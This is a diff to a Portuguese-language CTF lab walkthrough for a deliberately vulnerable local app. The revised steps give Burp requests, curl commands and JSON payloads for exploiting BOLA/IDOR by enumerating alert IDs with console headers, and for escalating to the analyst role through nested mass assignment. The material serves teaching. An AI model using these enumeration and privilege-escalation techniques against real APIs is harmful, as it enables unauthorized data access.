@@ -114,7 +114,7 @@ http://127.0.0.1:8094/static/js/sentinel.bundle.js
 
 - `/api/v2/me`
 - `/api/v2/alerts`
-- `/api/v2/alerts/{id}`
+- `/api/v2/alerts/{incidentId}`
 - `/api/v2/me/profile`
 - `/api/v2/debug/health`
 - `/api/v2/artifacts/build-manifest`
@@ -125,7 +125,14 @@ http://127.0.0.1:8094/static/js/sentinel.bundle.js
 - `/api/v2/jobs/output?file={name}`
 - `/api/v2/admin/diagnostics/read?file=app.log`
 
-O bundle nao entrega a solucao completa nem segredos completos no primeiro contato, mas entrega superficie, formatos de request, roles minimas e nomes internos suficientes para orientar a investigacao.
+Tambem aparecem metadados operacionais usados pela console, como `detailHeaders` para detalhes de alerta:
+
+```text
+X-Sentinel-Client: web-console
+X-Tenant-Scope: ACME-SOC
+```
+
+O bundle nao entrega a solucao completa nem segredos completos no primeiro contato, mas entrega superficie, formatos de request, roles minimas, padroes de incidente e nomes internos suficientes para orientar a investigacao.
 
 ### Burp
 
@@ -136,15 +143,52 @@ Envie os endpoints interessantes para Repeater. Organize abas por etapa: `me`, `
 ### Manual
 
 1. No dashboard, clique em `/api/v2/alerts`.
-2. Observe que a lista mostra apenas alertas visiveis ao usuario atual. Para o `intern`, os IDs esperados incluem `1001` e `1004`.
-3. Compare a lista com a rota de detalhe indicada no JavaScript: `/api/v2/alerts/{id}`.
-4. No navegador ou no Burp Repeater, altere o endpoint para:
+2. Observe que a lista mostra apenas alertas visiveis ao usuario atual. Para o `intern`, os IDs esperados incluem `7412` e `7468`.
+3. Compare a lista com a rota de detalhe indicada no JavaScript: `/api/v2/alerts/{incidentId}`.
+4. Tente abrir um detalhe diretamente pela barra do navegador. Sem o contexto operacional da console, a API retorna uma resposta generica:
 
 ```text
-/api/v2/alerts/1002
+/api/v2/alerts/7412
 ```
 
-5. A resposta retorna um alerta de outro owner. A falha e BOLA/IDOR: a listagem filtra por `owner_id`, mas o endpoint de detalhe valida apenas se o objeto existe.
+Resposta esperada:
+
+```json
+{
+  "ok": false,
+  "error": "alert unavailable"
+}
+```
+
+5. No Burp Repeater, repita a request com os headers operacionais vistos no bundle:
+
+```http
+GET /api/v2/alerts/7412 HTTP/1.1
+Host: 127.0.0.1:8094
+Cookie: token=...
+X-Sentinel-Client: web-console
+X-Tenant-Scope: ACME-SOC
+```
+
+6. Confirme que o detalhe de um alerta seu passa a retornar campos adicionais.
+7. Use Burp Intruder ou uma enumeracao controlada no Repeater. Como o bundle sugere padrao de incidente `7xxx` e a lista mostra dois IDs proximos, uma faixa curta em torno de `7380` a `7480` e suficiente para aula.
+8. Filtre por diferenca de tamanho, `ok: true` ou presenca do objeto `alert`. O ID vulneravel e:
+
+```text
+7391
+```
+
+9. Com os headers operacionais, acesse:
+
+```http
+GET /api/v2/alerts/7391 HTTP/1.1
+Host: 127.0.0.1:8094
+Cookie: token=...
+X-Sentinel-Client: web-console
+X-Tenant-Scope: ACME-SOC
+```
+
+10. A resposta retorna um alerta de outro owner. A falha continua sendo BOLA/IDOR: a API exige contexto fraco de console, mas nao valida corretamente `owner_id`.
 
 Flag:
 
@@ -187,7 +231,7 @@ Cookie: token=...
 }
 ```
 
-4. Em seguida, adicione um campo extra:
+4. Teste primeiro o Mass Assignment ingenuo com campo de topo:
 
 ```json
 {
@@ -199,8 +243,23 @@ Cookie: token=...
 }
 ```
 
-5. A aplicacao aceita `role=analyst` e emite um novo cookie JWT. Isso demonstra Mass Assignment: o backend faz merge de campos controlados pelo cliente e permite alterar uma propriedade sensivel.
-6. Teste tambem `role=admin`. O app bloqueia admin direto, o que preserva a cadeia e obriga a proxima etapa com JWT.
+Esse caminho direto nao deve elevar a role; o campo e ignorado. Teste tambem `role=admin` e confirme que admin direto e bloqueado.
+
+5. Volte ao bundle e observe que o formato esperado de perfil contem um objeto `access`. Envie o payload aninhado:
+
+```json
+{
+  "displayName": "Intern Analyst",
+  "preferences": {
+    "density": "compact"
+  },
+  "access": {
+    "requestedRole": "analyst"
+  }
+}
+```
+
+6. A aplicacao interpreta o campo aninhado como solicitacao de acesso e emite um novo cookie JWT com role `analyst`. Isso demonstra Mass Assignment por merge/validacao incompleta em propriedade aninhada, nao apenas no topo do JSON.
 7. Atualize o cookie do navegador, se o Burp nao fizer isso automaticamente.
 8. Abra `/api/v2/me` novamente e confirme `role: analyst`.
 
@@ -587,7 +646,12 @@ BOLA/IDOR:
 
 ```bash
 curl -s -b "$COOKIE" "$BASE/api/v2/alerts" | jq
-curl -s -b "$COOKIE" "$BASE/api/v2/alerts/1002" | jq
+curl -s -b "$COOKIE" "$BASE/api/v2/alerts/7391" | jq
+
+curl -s -b "$COOKIE" \
+  -H "X-Sentinel-Client: web-console" \
+  -H "X-Tenant-Scope: ACME-SOC" \
+  "$BASE/api/v2/alerts/7391" | jq
 ```
 
 Mass Assignment e role `analyst`:
@@ -597,6 +661,11 @@ curl -i -b "$COOKIE" -c "$COOKIE" \
   -X PATCH "$BASE/api/v2/me/profile" \
   -H "Content-Type: application/json" \
   -d '{"displayName":"Intern Analyst","preferences":{"density":"compact"},"role":"analyst"}'
+
+curl -i -b "$COOKIE" -c "$COOKIE" \
+  -X PATCH "$BASE/api/v2/me/profile" \
+  -H "Content-Type: application/json" \
+  -d '{"displayName":"Intern Analyst","preferences":{"density":"compact"},"access":{"requestedRole":"analyst"}}'
 
 curl -s -b "$COOKIE" "$BASE/api/v2/me" | jq
 ```
